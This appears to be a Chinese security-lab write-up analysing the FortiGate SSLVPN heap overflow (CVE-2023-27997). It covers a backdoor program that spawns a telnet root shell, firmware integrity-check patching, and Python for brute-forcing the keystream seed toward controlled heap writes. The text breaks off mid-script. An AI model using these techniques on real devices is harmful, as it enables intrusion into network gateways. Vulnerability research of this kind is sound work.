#  FortiGate SSLVPN 堆溢出漏洞分析与利用   
原创 林昀  山石网科安全技术研究院   2024-09-18 12:15  
  
## 漏洞信息  
  
处理env参数时存在逻辑缺陷，导致堆溢出写，漏洞利用可以导致任意代码执行。（CVE-2023-27997）  
## 环境搭建  
### 导入虚拟机  
  
打开 vmware 左上角 文件 -> 打开虚拟机 -> 选择 FortGate-VM64.ovf  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeLR6kGuRygm4EQwOFgP7H30wve3l6WB0tibDaRMhsdXZBWKM5VsvyGog/640?wx_fmt=png&from=appmsg "")  
  
直接就能运行 fortigate 登录账号：admin  密码：空，然后设置新密码  
  
admin  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MewMNPulk5o7DYGpjoPOLAMKLvFGBPWkoicSQ7D8Ou0s4Z9Du41qIReQg/640?wx_fmt=png&from=appmsg "")  
### 配置网络  
  
vm 下同样有作为攻击机器的 ubuntu-22 ，需要先设置 fortigate-vm 和 ubuntu-22 之间能够互通。关闭 fortigate-vm，并设置所有网络适配器为 Nat 模式  
  
先看一下ubuntu攻击机的ip，再来确定我们要设置的网段  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeuxLvHicClxpfrZLibicskCdJ7TLWOaerok2NutCAAuTZ03aicx4iasebxkA/640?wx_fmt=png&from=appmsg "")  
  
我的ubuntu处于192.168.18.0段，得设置一下实验机也在这个网段上  
  
记得多加一张net网卡  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeS2dPZBQ5ia69oNfdKR8pSTloRpVamUCbWgtKz2Vfd1wofhT1JQWEEyA/640?wx_fmt=png&from=appmsg "")  
  
配置成功之后，执行以下命令可以查看接口信息  
  
```
show system interface

```  
  
### 配置服务（telnet和ssh记得打开，否则后续23端口无法正常调试）  
  
```
config system interface
edit port1
 set mode static
 set ip 192.168.18.123 255.255.255.0
 set allowaccess http https ping ssh telnet
 end

```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me7cgPcXpOtanqDFQfWD8Wrz6D02yGLlXzV5BPHvRRlPqepnqffibOmVA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me9mLc5gSibR3giaqCkDsicUkQLzzoPziccPZRoS0uFmHhNXRNibrcKV3Unlg/640?wx_fmt=png&from=appmsg "")  
  
用命令查询情况，然后使用ubuntu攻击机看看情况  
  
访问飞塔的地址可以访问成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeoO6QOIN6c0Lv57Ficj5Av6u3wazRShZ5YAl9K4R9ef57a0icqwCibamJA/640?wx_fmt=png&from=appmsg "")  
  
使用我们刚刚设置的密码可以进入，但是要认证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Med0IXQZibbibRe0whHU56xKxBTnjyhlZnWpadvJKfsnrc28YqgV9yxEDg/640?wx_fmt=png&from=appmsg "")  
  
配置网关，连接外网  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeS2dPZBQ5ia69oNfdKR8pSTloRpVamUCbWgtKz2Vfd1wofhT1JQWEEyA/640?wx_fmt=png&from=appmsg "")  
  
在这里找出网ip地址即可  
  
```
config router static
 edit 1
 set device port1
 set gateway 192.168.18.2
 end

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MegSQAicqJpd2d4H1nc2dbF05vVkE1zHlJzAQzpH3vHVEoA56tekM9urA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeSib6OZNuhvZYe3XcRViaBIuzpUCokUDyMN4S0sfJa69XbPPzz7iboJbZg/640?wx_fmt=png&from=appmsg "")  
  
配置配置完就可以出网了  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeXic1IDibHYlUnLOZugbI9qAWdBPwibPBjprWPReWVEk8ibgtI1xyQscquA/640?wx_fmt=png&from=appmsg "")  
### 服务配置  
  
我们需要开启sslvpn的功能，需要对防火墙进行以下配置  
  
1、SSLVPN_address | subnet_addres | ubuntu22  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Mev1AMP2ZscSUlXuRe3YeoUOoiaLD7eRk6HHS77ZJjo27BkiaibSnbB8FEg/640?wx_fmt=png&from=appmsg "")  
  
再添加一个用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeLa19P31tsa7RMoE9ZawnEcjiaARiajXrXUj6WLQic2VWM3PibFxjoaf3Fg/640?wx_fmt=png&from=appmsg "")  
  
添加一个用户组，并把之前注册的用户添加进新的用户组  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeCfAU9C6fPbH2xiceu16kSXiamC5b6G7JYLzupsRVsmjZ7csmbicvXcibSg/640?wx_fmt=png&from=appmsg "")  
  
修改 vpn 门户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeNIXzJIyZa79iawgT2dwqh8yjmapRQ3POzbFPzN5l8eVoyku71EMxW4A/640?wx_fmt=png&from=appmsg "")  
  
修改full-access  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me2FU4PALj7jp9YAB5ichVY4jWvWMz25fvnXBZpyNwcXjBEfYcU14efYw/640?wx_fmt=png&from=appmsg "")  
  
修改后选择保存  
  
进入 vpn 设置，配置如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeK6bogk004lX7fkX2HD0BblMj0R6FGmSeRVWicHAm1ciaajJ1NfPF4kibw/640?wx_fmt=png&from=appmsg "")  
  
接着修改防火墙配置策略  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeY3ux5FiaOTCk6TbhFt6Muqqf3OwIIiamEuHzzbRMGPXQSpkLucKD3hMg/640?wx_fmt=png&from=appmsg "")  
  
之后https访问4433端口即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeZ4AARj58BkAaAc7TcBrvP1ibGibKYZicn1AHEBcrE9HNMBIoOXhAKnMkg/640?wx_fmt=png&from=appmsg "")  
### GDB调试环境搭建  
  
使用gdbserver+gdb进行调试，提前植入后门  
#### 提取固件  
  
在虚拟机关闭的情况下，右键，打开  
  
关闭防火墙  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me22MA83lIcXKD4xciaaYRsTjVOiaR2wSC89c4icEq43iaJuFxyaAMT4ZlzQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeMJCgFWmkicO91KnPepUTbefJic92kVNDSr3aFV9ia1EK5ZEZzaBNYMNBQ/640?wx_fmt=png&from=appmsg "")  
  
挂载之后，我们就可以拿到一整个文件系统的文件，包括内核  
  
需要将flatkc复制下来进行分析  
  
vmlinux-to-elf处理一下无符号的问题  
  
```
sudo apt install python3-pip liblzo2-dev
sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df
sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf

```  
```
vmlinux-to-elf flatkc flatkc-efl

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeEPa0RPFEtV4V0Pcy93MrlIRMGIsoBhN7WGia3blKrA0sg1YVwbVAnBQ/640?wx_fmt=png&from=appmsg "")  
#### busybox编译  
  
如果编译过程出错了，可以换个更高的busybox版本去编译  
  
```
    curl http://busybox.net/downloads/busybox-1.23.2.tar.bz2 | tar xjf -
    mkdir -p obj/busybox
    cd busybox-1.23.2
    make O=../obj/busybox defconfig #独立在新文件中进行相关配置
    cd ../obj/busybox
    make menuconfig

```  
  
#### 后门程序  
  
这里的话，因为我们要开启telnet服务作为shell，笔者的思路是将telnet开启然后开放在22端口，我们就可以利用这个端口作为一个shell，然后还要把telnet服务的给替换成我们的gdbserver调试端口，只需要关闭即可  
  
```
#include <stdio.h>

void shell(){
        system("/bin/busybox ls", 0, 0);
        system("/bin/busybox killall sshd && /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22", 0, 0);
        return;
}

int main(int argc, char const *argv[])
{
        shell();
        return 0;
}
```  
  
  
需要给他静态编译一下  
  
```
gcc smartctl.c -static -o smartctl

```  
  
#### gdbserver  
  
```
https://github.com/hugsy/gdb-static

```  
  
  
编译之后我，把gdbserver和busybox还有我们编译的后门程序smartctl放到bin目录底下  
#### 重打包sudo chroot ./ sbin/ftar -cf bin.tar binsudo chroot ./ sbin/xz --check=sha256 -e bin.tarsudo find ./ | cpio -H newc -o > ../rootfs.rawcd ../sudo cat ./rootfs.raw | gzip > rootfs.gz  
#### 注入后门  
  
反编译内核文件flatkc  
  
```
void __fastcall __noreturn init_post_isra_0(__int64 a1, void **a2){
  char v2; // al
  __int64 v3; // rax
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d
  char v8; // [rsp-8h] [rbp-8h]

  v8 = v2;
  async_synchronize_full(a1, a2);
  free_initmem();
  dword_FFFFFFFF80A19880 = 1;
  numa_default_policy();
  v3 = *(_QWORD *)(__readgsqword(0xB700u) + 1048);
  *(_DWORD *)(v3 + 92) |= 0x40u;
  if ( !(unsigned int)fgt_verify() )//校验函数
  {
    off_FFFFFFFF809B82C0 = "/sbin/init";
    a2 = &off_FFFFFFFF809B82C0;
    kernel_execve("/sbin/init", &off_FFFFFFFF809B82C0, off_FFFFFFFF809B81A0);
  }
  panic(
    (unsigned int)"No init found.  Try passing init= option to kernel. See Linux Documentation/init.txt for guidance.",
    (_DWORD)a2,
    v4,
    v5,
    v6,
    v7,
    v8);
}
```  
  
  
我们注入后门程序之后，要开机也是需要断点断在fgt_verify() 函数，将返回值修改  
  
在代码中，我们能知道，启动的是sbin中的init文件，我们对init文件中校验逻辑进行patch  
  
verify_kernel_and_rootfs_0(）会对内核文件进行验证，不通过会执行dohalt重启内核，我们需要把他patch掉，不执行do_halt  
  
最后patch之后的代码是这样子的  
  
```
     requested_time.tv_sec);
    sub_450510(1LL);
    sub_4537B0();
    sub_452D00();
    sub_451240();
    sub_4511A0();
    if ( (unsigned int)sub_253C4D0() )
    {
      sub_26118A0();
      sub_450200("/bin/fips_self_test");
    }
    else
    {
      sub_4511F0();
      sub_2573800();
    }
    v21 = "/tmp/terminfo";
    sub_27F6B50("/data/etc/terminfo");
    sub_4533C0("/data/etc/terminfo", "/tmp/terminfo");
    sub_453460();
```  
  
  
使用内核文件下断点，修改寄存器的值为0  
  
```
import gdb

class SetRaxBreakpoint(gdb.Breakpoint):
    def __init__(self, bp_expr, rax_value, temporary=False):
        gdb.Breakpoint.__init__(self, bp_expr, gdb.BP_BREAKPOINT, False, temporary)
        self.rax_value = rax_value
        self.silent = True

    def stop(self):
        gdb.execute('set $rax = {}'.format(self.rax_value))

gdb.execute('set architecture i386:x86-64')
gdb.execute('set pagination off')

r1 = SetRaxBreakpoint('*0xFFFFFFFF807AB09C', 0)
r2 = SetRaxBreakpoint('*0x4518C9', 1)
r3 = SetRaxBreakpoint('*0x277fccc', 1)

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeL3umuaPbWKCccpY6OQ69sRGy8Slp8MOB0ag4kMUkbk0qajaKypnOxA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeoIVkWxMWpXryrxd5xdR2Hpn9bnUR0UBTPErH8iafVxhKCkboIsrCdLw/640?wx_fmt=png&from=appmsg "")  
  
gdb进行内核调试之后，修改返回值为0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MerCicWCFI0RGKBDW0tAIGfZapjgGqsuI9dI2TGR814GMEIFWjs9TV7qg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me1c5ia7a0haOXWQMWiciaaTU5lyPK8RZ0gZy8DdTCpYlhiclKeiczDRv2F7g/640?wx_fmt=png&from=appmsg "")  
  
排查init文件看看哪里被拦住了，根据字符串搜索，需要对此处进行patch操作  
  
```
__int64 __fastcall sub_44B9A0(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  char *v6; // rsi
  int v7; // edx
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  __pid_t v11; // ebx
  int v12; // edx
  int v13; // ecx
  int v14; // r8d
  int v15; // r9d
  unsigned int v16; // r12d
  _DWORD stat_loc[3]; // [rsp+Ch] [rbp-104h] BYREF
  char v19[8]; // [rsp+18h] [rbp-F8h] BYREF
  char *envp[4]; // [rsp+20h] [rbp-F0h] BYREF
  char *argv[6]; // [rsp+40h] [rbp-D0h] BYREF
  char path[136]; // [rsp+70h] [rbp-A0h] BYREF
  unsigned __int64 v23; // [rsp+F8h] [rbp-18h]

  v23 = __readfsqword(0x28u);
  argv[1] = path;
  stat_loc[0] = -1;
  envp[0] = "TERM=vt100";
  envp[1] = "PATH=/bin:/sbin";
  envp[2] = 0LL;
  argv[0] = "/bin/mke2fs";
  argv[2] = "-b4096";
  argv[3] = "-j";
  argv[4] = 0LL;
  sub_1DE95C0((unsigned int)"Formatting shared data partition ... ", a2, a3, a4, a5, a6);//打印的字符串在这里
  v6 = v19;
·······
    if ( stat_loc[0] )
    {
      v16 = -1;
      sub_1DE95C0((unsigned int)"failed, status=%d!\n", 0, v12, v13, v14, v15);//校验失败打印的字符串位置
      
    }
    else
    {
    sub_1DE95C0((unsigned int)"done!\n", 128, v12, v13, v14, v15);
    }
  }
  else
  {
    v16 = -1;
    sub_1DE95C0((unsigned int)"\nCannot get shared data partition\n", (_DWORD)v6, v7, v8, v9, v10);
  }
  return v16;
}
```  
  
  
直接patch这里  
  
我们可以看到他是一个条件判断，这个自己把jnz改成jz即可  
  
```
.text:000000000044BAB5                 jnz      short loc_44BAF5    ;将此处修改为jnz即可   
.text:000000000044BAB7                 mov     edi, offset aDone_3 ; "done!\n"
.text:000000000044BABC                 xor     eax, eax
.text:000000000044BABE                 call    sub_1DE95C0
.text:000000000044BAC3
.text:000000000044BAC3 loc_44BAC3:                             ; CODE XREF: sub_44B9A0+153↓j
.text:000000000044BAC3                                         ; sub_44B9A0+16A↓j
.text:000000000044BAC3                 mov     rax, [rbp+var_18]
.text:000000000044BAC7                 sub     rax, fs:28h
.text:000000000044BAD0                 jnz     short loc_44BB0C
.text:000000000044BAD2                 add     rsp, 100h
.text:000000000044BAD9                 mov     eax, r12d
.text:000000000044BADC                 pop     rbx
.text:000000000044BADD                 pop     r12
.text:000000000044BADF                 pop     rbp
.text:000000000044BAE0                 retn

```  
  
  
改成jz即可  
  
```
.text:000000000044BAB5                 jz      short loc_44BAF5
.text:000000000044BAB7                 mov     edi, offset aDone_3 ; "done!\n"
.text:000000000044BABC                 xor     eax, eax
.text:000000000044BABE                 call    sub_1DE95C0
.text:000000000044BAC3
.text:000000000044BAC3 loc_44BAC3:                             ; CODE XREF: sub_44B9A0+153↓j
.text:000000000044BAC3                                         ; sub_44B9A0+16A↓j
.text:000000000044BAC3                 mov     rax, [rbp+var_18]
.text:000000000044BAC7                 sub     rax, fs:28h
.text:000000000044BAD0                 jnz     short loc_44BB0C
.text:000000000044BAD2                 add     rsp, 100h
.text:000000000044BAD9                 mov     eax, r12d
.text:000000000044BADC                 pop     rbx
.text:000000000044BADD                 pop     r12
.text:000000000044BADF                 pop     rbp
.text:000000000044BAE0                 retn

```  
  
  
重新打包之后尝试开机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me0gZjcjzU93btafiaXtraWicqvdqgMqZNWPpk169pL3H4ibiacFMKnkh3NA/640?wx_fmt=png&from=appmsg "")  
  
哪里拦住了就patch哪里，直到正常启动  
  
正常开机了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MesbeFHBfbWRsUCk2NPxYOxIEUjF0FFZ4ZvbS3FAzS2FwydhrLVxYibew/640?wx_fmt=png&from=appmsg "")  
  
开机之后就可以用telnet连接得到shell了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Mek3WMk3bDhX08GUVpGV1ZicshhfB6dUibcbfWA5U2LIdWFJwM2xhxhUew/640?wx_fmt=png&from=appmsg "")  
#### 关于gdb调试的问题  
  
gdb调试端口在23，飞塔防火墙不允许多开放端口，关闭telet服务即可，然后使用23端口作为gdbserver调试端口  
  
连不上记得检查telnet是不是没开  
  
```
b je_malloc if $rdi>0x1c00 && $rdi < 0x2000
target remote 192.168.18.123:23

```  
```
busybox ls
busybox ps -ef | grep /bin/sslvpnd   #获取要调试的进程号

gdbserver-7.10.1-x64   :23  --attach 183

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me4ePxh1ajCzGe4woRcfzHk9DTlHWloYvib7G70jnYdR0Vjpp0TDhpD3g/640?wx_fmt=png&from=appmsg "")  
  
就可以快乐的调试了，笔者是断在了jemalloc的位置  
## jemalloc分析  
  
由于gdb没有这块内容的实现，我们可以写一个gdb调试脚本去进行测试与记录，把程序malloc的堆块全部打印出来，笔者不想看太小的size，只打印了大于0x100的size出来查看  
  
```
import gdb

class JemallocTracer(gdb.Command):
    def __init__(self):
        super(JemallocTracer, self).__init__("trace-jemalloc", gdb.COMMAND_USER)
        self.hooked = False

    def invoke(self, arg, from_tty):
        if not self.hooked:
            self.create_breakpoints()

    def create_breakpoints(self):
        """        Creates breakpoints on je_malloc, je_calloc, je_realloc, and je_free        """
        functions = ['je_malloc']
        for func in functions:
            GdbBreakpoint(func)
        
        self.hooked = True
        gdb.execute("continue")

class GdbBreakpoint(gdb.Breakpoint):
    def __init__(self, spec):
        super().__init__(spec, gdb.BP_BREAKPOINT, internal=True)

    def stop(self):
        """        On hitting the function entry breakpoint, set a temporary finish breakpoint.        """
        frame = gdb.selected_frame()
        func_name = frame.name()
        if func_name in ["je_malloc", "je_calloc", "je_realloc", "je_free"]:
            FinishBreak(func_name)
        return False  # Continue execution after setting finish breakpoint

class FinishBreak(gdb.FinishBreakpoint):
    def __init__(self, func_name):
        super().__init__(internal=True)
        self.func_name = func_name

    def stop(self):
        """        On hitting the function return breakpoint, capture the return value and print relevant info.        """
        if self.func_name == "je_malloc":
            size = gdb.parse_and_eval("$rdi")
            addr = gdb.parse_and_eval("$rax")
            if(size>0x200):
             #记录ssl结构体的堆块
                if(size== 0x1db8):
                     print(f"je_malloc: size = {size}, addr = {addr}")
                     printf(f"httpssl struct addr===>{addr}")
                else:
                     print(f"je_malloc: size = {size}, addr = {addr}")

        return False  # Continue execution after printing

# Register the command with GDB
JemallocTracer()

```  
  
## 漏洞分析  
  
./bin/init程序  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MeH9Vznb0BuWvmLk3TVrJUFCcyljPuqI3icjv3OqL6s4nficwduN3seJIQ/640?wx_fmt=png&from=appmsg "")  
  
当我们向 fortigate sslvpn 发送一个 enc 的 HTTP 参数的时候, 会进到一个 parse_enc_data 的函数逻辑里.  
### 溢出逻辑审计  
  
```
   v3 = "/sslvpn/portal.html";
  enc = (const char *)sub_1553E50(*(_QWORD *)(v2 + 744), "enc");// 类似websgetvaule
  if ( enc && (int)parse_enc_data(v2, a1, enc) < 0 )
  {
    output(v2, 8LL, (__int64)"could not decode 'enc' data properly.");
    goto LABEL_16;
  }

```  
  
  
程序逻辑  
  
1、首先会判断是否是偶数，如果是偶数就会进入功能点  
  
2、输入流前八个字节+salt生成md5序列，这些md5序列与输入流进行异或并存储  
  
3、将输入流以两个字节的 **ascii**看成一个新的字节。比如传进来的是 "010203040506abcdefgh"字符串，那么就会转为 "\x01\x02\x03\x04\x05\x06\xab\xcd\xef\xgh"储存到堆上，并在末尾置零。也就是之前数据长度的1/2+1申请chunk的原因了  
  
16进制字符串转化为实际的16进制数  
  
```
  do
      {
        v6 = sub_15D65D0(encdata[2 * v5]);
        chunk[v5] = sub_15D65D0(encdata[2 * v5 + 1]) + 16 * v6;
        ++v5;
      }

```  
  
  
也就是上面这个部分的功能点  
  
之后呢，会进入加密的核心部分  
  
```
    chunk = v8 + 4;
      size = *((_WORD *)v8 + 2);                // 字节流中第三个字节表示大小
      v11 = (unsigned __int8)(size ^ md5[0]);   // 异或处理低字节的数值
      BYTE1(v11) = md5[1] ^ HIBYTE(size);       // 异或处理高字节的数值
                                                // 
      if ( v18 - 5 <= (unsigned __int8)(size ^ md5[0]) )// length - 5 后小于等于 enc 加密数据中的 give_length
      {
        output(a1, 8LL, (__int64)"invalid enc data length: %d\n", (unsigned __int8)(size ^ md5[0]));
        return 1LL;
      }
      else
      {
        v12 = v8 + 6;
        chunk = v12;
        if ( (unsigned __int8)size != md5[0] )
        {
          v13 = (unsigned int)(unsigned __int8)(size ^ md5[0]) - 1;
          v14 = 0LL;
          v15 = 2;
          while ( 1 )
          {
            v12[v14] ^= md5[v15];
            if ( v13 == v14 )
              break;
            v15 = ((_BYTE)v14 + 3) & 0xF;
            if ( (((_BYTE)v14 + 3) & 0xF) == 0 )
            {
              v20 = v11;
              MD5_Init(v23);
              MD5_Update((__int64)v23, (__int64)md5, 16LL);
              MD5_Final(md5, v23);
              v11 = v20;
            }
            v12 = chunk;
            ++v14;
          }

```  
  
  
加密部分的逻辑大概的伪代码如下  
  
```
 if (given_len)
    {
        int i = 0LL;
        while (i < size)
        {
            p[i] ^= md5[(i + 3) % 16];
            if ((i + 3) % 16 == 0) #处理14个字符就会更新一次秘钥流
            {
                MD5_Init(md5_ctx);
                MD5_Update(md5_ctx, md5, 16LL);
                MD5_Final(md5, md5_ctx);
            }
            ++i;
        }
    }
    out[6 + size] = 0;

```  
  
  
假设我payload长度是5000，那么转化为处理的数组就是2500，（2500-14）/16，向上取整应该是第156组，用第156组进行异或处理  
  
在out加密执行完之后，在len+6的地方补0，硬编码的偏移，我们可以来看看如何让他溢出写  
### 溢出的条件  
  
```
(enclength >> 1) + 1<     size     <enclength-5即可实现堆溢出越界写入

```  
  
  
假设我们输入的长度是50   刚好是一个偶数并且大于11，那么按照逻辑会分配一块25+1的堆块，也就是大小为26的chunk，我们的size确保比enclenth小6，即44，这样子其实就可以溢出写了  
### enc结构与md5密钥生成逻辑  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me9gM9RIib84Ta0DPnL05smChjjObjYxTBiaBPtaRfcGqVbpnJ7QBnp4ibA/640?wx_fmt=png&from=appmsg "")  
  
size和后面内容部分是被加密的，seed是没有被加密的，seed部分会被取来，与salt生成种子  
  
密的数据需要用到密钥流解密，设密钥流有 S0 | S1 | S2 | S3 | Sn-1 | Sn | Sn+1 ..... 组成 根据 seed ，以及 salt 和 "GCC is the GNU Compiler Collection." 可以计算出 S0 S0=MD5(salt∣seed∣‘‘GCC is the GNU Compiler Collection.′′) salt 是服务器创建的随机值，可以通过向 /remote/info 访问得到 密钥流的其他状态是这样计算的：  
  
```
S1=MD5(S0) 
S2=MD5(S1)
Sn+1=MD5(Sn)
S=S1∣S2∣S3∣...∣Sn

```  
  
  
其中，S0 与 enc 中 size 及 data 前 14 个字节进行异或解密得到未加密的 size 和 data，S1 与 enc 中  data 前 14 个字节之后的数据进行异或解密得到未加密的 data，S2 与 enc 中 data 前 (14 + 16) 个字节 之后的数据进行异或解密得到未加密的 data，在此之后，以每 0x10 为单位，不断循环解密  
  
后续会与payload进行异或，如果这部分可控，那么基本后续的内容都可以接触，我们提前异或上秘钥，再次异或密钥就可以恢复  
### 密钥流解密  
#### 内存控制思路  
  
漏洞的作者提出的思路是，两次异或就可以把数据恢复  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73MexEcFp57wukjnDGuZ5Z9GKTKC3Pobh6UiaaCSFsgccdZicjk4RePYuevw/640?wx_fmt=png&from=appmsg "")  
  
如果我们连续申请两次，第一次和第二次所申请到的堆块是同一个地方，我们两次都用同样的密钥流处理，第一次data被异或后是乱码，第二次异或就可以将数据恢复，只是不同的是，第一次的结尾会被置0，还有一个特性是  
  
**0^k=k**  
  
第一次申请了size，那我们第二次就可以申请size+1，这样子size+1的位置就是0，我们就可以把key的数值写在key+1的地方了！key值可以通过碰撞出我们需要的数值  
  
作者给出的示例是第一次申请4999，内存分布如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Me48ibb1iceK3U6icxbtBtEGeU6YUKZw3y0c18iaJfneILMlk3Xib2hDJ80VA/640?wx_fmt=png&from=appmsg "")  
  
第二次申请5000，内存分布如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR1Ivt65QXRZicIhy5iaT73Men1APWIm3ruyQXQiaq1tPwY11G2O2HzZWACdF1N1PhChoaHFQepdeIuQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到内存是可控的，我们可以利用这个写任意字节+\x00  
  
md5的字节流是我们可控的，但是需要去碰撞出可用的数值，接下来，我们要一步一步地去把这个部分做到可控，我们要做到面对不同的salt值，不同的长度做到任意偏移任意字节生成  
  
我们需要完成的任务：  
  
1、需要完成一个哈希碰撞的脚本  
  
2、需要完成把需要的数据先异或，之后在把他们由hex转化为字符串形式  
#### salt部分  
  
**salt**可通过请求 **/remote/info**获取到它的值  
  
```
salt = ''
salt_url = "https://192.168.18.123:4433/remote/info"
def get_salt():
 s = requests.get(salt_url, verify=False)
 data = s.text.split(' ')[4]
 return data.split("'")[1]
salt = get_salt().encode()

```  
  
#### seed部分  
  
S0=MD5(salt∣seed∣‘‘GCC is the GNU Compiler Collection.′′)  
  
我们可以看到密钥流的生成，salt是不可控的，后面的字符串是固定的，要想做到稳定的字节生成，就需要从seed中入手  
  
哈希碰撞脚本如下  
  
```
import hashlib
import requests
#该文件完成了
#   md5fun  完成对对应长度对应seed的md5值生成 
#   get_salt 函数完成了像服务器获取salt值
#   md5hex完成了对应的md5值碰撞
#   hex2str  对payload转化为字符串形式
#   crypt2hex  碰撞出对应的seed，，先对字节流进行加密，然后转化为字符串

def md5fun(salt, seed, payloadlen):
    """    生成基于给salt和种子的 MD5 密钥流。    :param salt: 盐值，类型为 bytes    :param seed: 种子值，类型为 bytes    :param payloadlen: 输入数据的长度    :return: 生成的密钥流，类型为 bytes    """
    # 初始化数据，即第一次
    s0 = hashlib.md5()
    s0.update(salt)
    s0.update(seed[:8])  # 只取前 8 字节作为种子
    s0.update(b"GCC is the GNU Compiler Collection.")

    # 计算第一个 MD5 值
    buffer = s0.digest()
    print("Initial buffer:", buffer.hex())  # 打印初始 buffer

    # 根据不同长度的 payload 生成对应的 md5 值
    while payloadlen >= len(buffer):
        m = hashlib.md5()
        m.update(buffer[-16:])  # 更新 MD5 使用最后 16 个字节
        result = m.digest()
        buffer += result

    return buffer

def get_salt(url):
    """    从指定的 URL 获取salt值并返回。    :param url: 获取salt值的请求 URL    :return: 获取到的salt值，类型为 bytes    """
    try:
        response = requests.get(url, verify=False)
        response.raise_for_status()
        data = response.text.split(' ')[4]  
        salt = data.split("'")[1]
        return salt.encode()
    except requests.RequestException as e:
        print(f"请求错误: {e}")
        return None
    except IndexError:
        print("响应数据格式不正确")
        return None

def md5hex(salt, target_byte, offset, max_attempts=1000000):
    """    碰撞算法，爆破 seed 以使指定偏移处的字节等于目标字节。    :param salt: salt值，类型为 bytes    :param target_byte: 目标字节，类型为 int    :param offset: 偏移值，类型为 int    :param max_attempts: 最大尝试次数，类型为 int    :return: 满足条件的 seed 或 None    """
    for seed in range(max_attempts):
        # 将当前种子转换为字节
        seed_bytes = seed.to_bytes(4, byteorder='big', signed=False) 
        
        # 生成 MD5 密钥流
        key_stream = md5fun(salt, seed_bytes, 20480)

        # 检查指定偏移处的字节是否符合目标字节
        if len(key_stream) > offset and key_stream[offset] == target_byte:
            print(f"找到匹配的 seed: {seed}, "
                  f"对应的 MD5 字节流在偏移 {offset} 处的字节为: {key_stream[offset]:02x}")
            print(seed_bytes.hex())  # 使用 hex() 函数
            return seed_bytes
        
    print("未找到匹配的 seed。")
    return None


def hex2str(payload):
